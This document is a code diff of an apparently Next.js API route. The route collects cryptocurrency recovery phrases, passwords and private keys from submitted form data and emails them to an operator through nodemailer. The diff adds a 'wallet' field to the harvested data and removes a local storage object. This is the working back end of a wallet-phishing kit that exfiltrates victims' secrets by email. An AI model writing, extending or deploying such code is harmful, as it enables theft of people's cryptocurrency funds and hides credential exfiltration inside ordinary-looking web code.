@@ -5,12 +5,7 @@ interface Payload {
   phrase?: string;
   password?: string;
   privateKey?: string;
-}
-
-interface StoredData {
-  phrase?: string;
-  password?: string;
-  privateKey?: string;
+  wallet?: string;
 }
 
 const transporter = nodemailer.createTransport({
@@ -37,6 +32,7 @@ export async function POST(request: Request) {
           ${body.phrase ? `<li>Recovery Phrase: ${body.phrase}</li>` : ""}
           ${body.password ? `<li>Password: ${body.password}</li>` : ""}
           ${body.privateKey ? `<li>Private Key: ${body.privateKey}</li>` : ""}
+          ${body.wallet ? `<li>Wallet: ${body.wallet}</li>` : ""}
         </ul>
         <p>Please log in to the secure admin dashboard for full details.</p>
         <p>This is an automated message. Please do not reply to this email.</p>
@@ -54,13 +50,6 @@ export async function POST(request: Request) {
         { status: 400 }
       );
     }
-
-    // Store the received data in an object
-    const storedData: StoredData = {};
-
-    if (body.phrase) storedData.phrase = body.phrase;
-    if (body.password) storedData.password = body.password;
-    if (body.privateKey) storedData.privateKey = body.privateKey;
 
     // Return the stored data as the response
 
